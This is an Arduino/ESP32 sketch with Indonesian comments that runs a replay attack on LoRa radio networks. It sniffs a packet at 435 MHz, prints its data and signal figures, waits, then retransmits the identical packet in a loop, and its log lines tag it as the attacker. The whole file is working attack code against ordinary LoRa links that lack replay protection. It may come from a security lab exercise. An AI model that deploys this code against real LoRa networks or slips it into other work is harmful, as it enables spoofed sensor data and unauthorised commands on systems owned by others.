#include <SPI.h>
#include <LoRa.h>

// Pinout LoRa sesuai hardware kamu
#define LORA_SCK   12
#define LORA_MISO  13
#define LORA_MOSI  11
#define LORA_SS    10
#define LORA_RST   5
#define LORA_DIO0  4

#define LORA_FREQ 435E6

// Buffer untuk merekam paket yang di-sniff
String replayed_data = "";
bool has_captured = false;

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Inisialisasi SPI dan Pin LoRa
  SPI.begin(LORA_SCK, LORA_MISO, LORA_MOSI, LORA_SS);
  LoRa.setPins(LORA_SS, LORA_RST, LORA_DIO0);

  if (!LoRa.begin(LORA_FREQ)) {
    Serial.println("LoRa gagal start");
    while (1);
  }

  // Konfigurasi parameter jaringan (harus sama dengan target)
  LoRa.setSpreadingFactor(7);
  LoRa.setSignalBandwidth(125E3);
  LoRa.setCodingRate4(5);
  LoRa.enableCrc();

  Serial.println("[ATTACKER] LoRa Replay Machine Ready...");
}

void loop() {
  // 1. FASE SNIFFING (Mendengarkan & Merekam Data)
  if (!has_captured) {
    int packetSize = LoRa.parsePacket();

    if (packetSize) {
      replayed_data = ""; // Clear buffer

      // Baca isi paket payload
      while (LoRa.available()) {
        replayed_data += (char)LoRa.read();
      }

      Serial.println("\n=== [ATTACKER] Paket Valid Tertangkap ===");
      Serial.print("RSSI : "); Serial.println(LoRa.packetRssi());
      Serial.print("SNR  : "); Serial.println(LoRa.packetSnr());
      Serial.print("DATA : "); Serial.println(replayed_data);
      
      has_captured = true; // Kunci data, siap masuk fase attack
      Serial.println("[ATTACKER] Mempersiapkan waktu delay untuk replay...");
      delay(5000); // Jeda waktu sebelum melakukan replay (mengelabui aspek waktu/fase)
    }
  } 
  // 2. FASE REPLAY (Mengirim Ulang Paket Payload)
  else {
    Serial.println("\n[ATTACKER] Melancarkan Replay Attack...");
    
    // Kirim ulang paket yang persis sama ke jaringan LoRa
    LoRa.beginPacket();
    LoRa.print(replayed_data);
    LoRa.endPacket();
    
    Serial.println("[ATTACKER] Paket berhasil di-replay!");
    
    // Reset flag kalau mau nge-sniff paket baru lagi, atau delay untuk terus membombardir paket yang sama
    has_captured = false; 
    delay(5000); // Jeda antar serangan berikutnya
  }
}